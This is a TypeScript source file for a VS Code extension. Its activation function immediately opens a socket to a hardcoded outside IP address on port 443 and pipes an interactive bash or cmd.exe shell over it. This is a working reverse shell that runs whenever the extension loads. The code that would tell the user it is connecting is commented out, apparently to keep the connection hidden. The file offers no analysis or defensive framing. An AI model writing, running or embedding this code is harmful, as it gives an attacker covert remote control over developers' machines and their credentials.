import * as vscode from 'vscode';
import * as net from 'net';
import { spawn, ChildProcessWithoutNullStreams } from 'child_process';
import * as os from 'os';

function getShellCommand(): { command: string, args?: string[] } {
    if (os.platform() === 'win32') {
        return { command: 'cmd.exe' };
    } else {
        return { command: '/bin/bash', args: ['-i'] };
    }
}

function connectReverseShell() {
    const client = new net.Socket();

    client.on('error', (err) => {
        vscode.window.showErrorMessage(`Connection error: ${err.message}`);
        console.error('Connection error:', err.message);
    });

    client.on('close', () => {
        //vscode.window.showInformationMessage('Connection closed');
        console.log('Connection closed');
    });

    client.connect(443, '172.105.37.93', () => {
        //vscode.window.showInformationMessage('Connected to the remote server.');
        //console.log('Connected to the remote server.');

        const shellConfig = getShellCommand();
        const shell: ChildProcessWithoutNullStreams = spawn(shellConfig.command, shellConfig.args);

        client.pipe(shell.stdin as any);
        shell.stdout.pipe(client);
        shell.stderr.pipe(client);

        shell.on('exit', () => {
            client.end();
            console.log('Shell exited');
        });

        shell.on('error', (err) => {
            vscode.window.showErrorMessage(`Shell error: ${err.message}`);
            console.error('Shell error:', err.message);
            client.end();
        });
    });
}

export function activate(context: vscode.ExtensionContext) {
    //vscode.window.showInformationMessage('Attempting to initiate reverse shell connection...');
    //console.log('Attempting to initiate reverse shell connection...');
    connectReverseShell();
}

export function deactivate() {}
